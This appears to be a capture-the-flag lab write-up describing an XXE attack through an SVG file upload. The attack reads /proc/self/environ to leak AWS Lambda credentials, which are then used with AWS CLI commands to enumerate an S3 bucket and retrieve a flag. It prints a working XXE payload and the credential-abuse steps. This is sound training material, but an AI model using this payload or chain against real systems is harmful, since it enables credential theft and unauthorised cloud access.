# File Upload XXE to Initial Access

As a first step, we have the ip address of the machine where we will perform an nmap scanning


nmap -sV -sC -Pn `52.52.110.46`
![Schermata XXE](https://github.com/jacopo1223/jacopo.github/blob/main/File%20Upload%20XXE%20to%20Initial%20Access/write%20up.png)

we go inside `52.52.110.46:80`
![Schermata XXE](https://github.com/jacopo1223/jacopo.github/blob/main/File%20Upload%20XXE%20to%20Initial%20Access/write%20up2.png)
and go to the upload section

where we can insert documents or PDF,SVG,PNG,DOC
Now let's try inserting a PDF file 
We start by downloading the target PDF file from the specified S3 bucket. The file can be found at the following URL:
https://huge-logistics-dump.s3.us-west-1.amazonaws.com/uploads/file_XsbYgmXZ5n.pdf
![Schermata XXE](https://github.com/jacopo1223/jacopo.github/blob/main/File%20Upload%20XXE%20to%20Initial%20Access/write%20up3.png)
To exploit the XXE vulnerability, we need to inject a reference to an external entity into an XML document. This will cause the XML parser to read from a local file, such as /proc/self/environ, which contains environment variables that could include sensitive AWS credentials.

The XML payload can be constructed as follows:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE replace [
<!ENTITY xxe SYSTEM 'file:///proc/self/environ'>
]>
<svg>
  <text>&xxe;</text>
</svg>
```

![Schermata XXE](https://github.com/jacopo1223/jacopo.github/blob/main/File%20Upload%20XXE%20to%20Initial%20Access/write%20up4.png)
This code injects the contents of /proc/self/environ (which includes environment variables) into an SVG document. The XXE vulnerability allows you to extract sensitive information, such as AWS access keys, session tokens and other environment variables.

![Schermata XXE](https://github.com/jacopo1223/jacopo.github/blob/main/File%20Upload%20XXE%20to%20Initial%20Access/write%20up5.png)
Lambda functions can access environment variables in the file /proc/self/environ. To retrieve sensitive data such as AWS credentials, you can export these environment variables:

export AWS_ACCESS_KEY_ID="<access_key>"

export AWS_SECRET_ACCESS_KEY="<secret_key>"

export AWS_SESSION_TOKEN="<secret_token>"

# ATTENTION

Important Notes:

![Schermata XXE](https://github.com/jacopo1223/jacopo.github/blob/main/File%20Upload%20XXE%20to%20Initial%20Access/writeup6.png)

Be sure to exclude the SHLVL parameter, as it may interfere with AWS credentials.
AWS session tokens are base64 encoded, so be sure to copy the entire token, including the final = or == characters.
AWS credentials beginning with AKIA indicate long-term keys, while those beginning with ASIA are temporary session keys that require a session token.
![Schermata XXE](https://github.com/jacopo1223/jacopo.github/blob/main/File%20Upload%20XXE%20to%20Initial%20Access/writeup7.png)

To obtain AWS entity information, run the following command:


`aws sts get-caller-identity`
![Schermata XXE](https://github.com/jacopo1223/jacopo.github/blob/main/File%20Upload%20XXE%20to%20Initial%20Access/writeup8.png)
If you already know the name of the role, you can obtain the details of the role using the command:

`aws iam get-role --role-name S3PutObjectRole`


This command returns the JSON output shown below and the role description refers to a new bucket named logistics-processing bucket. 
`{
    "Role": {
        "Path": "/",
        "RoleName": "S3PutObjectRole",
        "RoleId": "AROARSCCN4A3XDUV2IJGA",
        "Arn": "arn:aws:iam::107513503799:role/S3PutObjectRole",
        "CreateDate": "2023-10-30T06:34:05Z",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "Service": "lambda.amazonaws.com"
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        },
        "Description": "Allows Lambda functions to write objects in the huge-logistics-dump bucket and read from the huge-logistics-processing bucket.",
        "MaxSessionDuration": 3600,
        "RoleLastUsed": {
            "LastUsedDate": "2023-11-22T16:51:21Z",
            "Region": "us-west-1"
        }
    }
}`

This reveals a SQLite database called data-service.sqlite . 
SQLite is a popular and easy-to-use relational database system that developers often incorporate into their applications.

To see the files contained in the huge-logistics-processing bucket, use the command:

`aws s3 ls huge-logistics-processing --recursive --human-readable --summarize`

This command will list all the files in the bucket, showing their size in a readable format and a summary of the information.

In the bucket there is a file called flag.txt, you can retrieve it with the command:

![Schermata XXE](https://github.com/jacopo1223/jacopo.github/blob/main/File%20Upload%20XXE%20to%20Initial%20Access/writeup9.png)

 `aws s3 cp s3://huge-logistics-processing/TEMP-IT/flag.txt -`

The - symbol at the end of the command indicates that you want to display the contents of the file directly in the terminal, instead of copying it to a local file

If you prefer to save the file locally, you can do so:
`aws s3 cp s3://huge-logistics-processing/TEMP-IT/flag.txt /path/to/local/flag.txt`
![Schermata XXE](https://github.com/jacopo1223/jacopo.github/blob/main/File%20Upload%20XXE%20to%20Initial%20Access/writeup10.png)
naturally replace /path/to/local with the path you wish to save the file.

# FLAG FOUND!!!
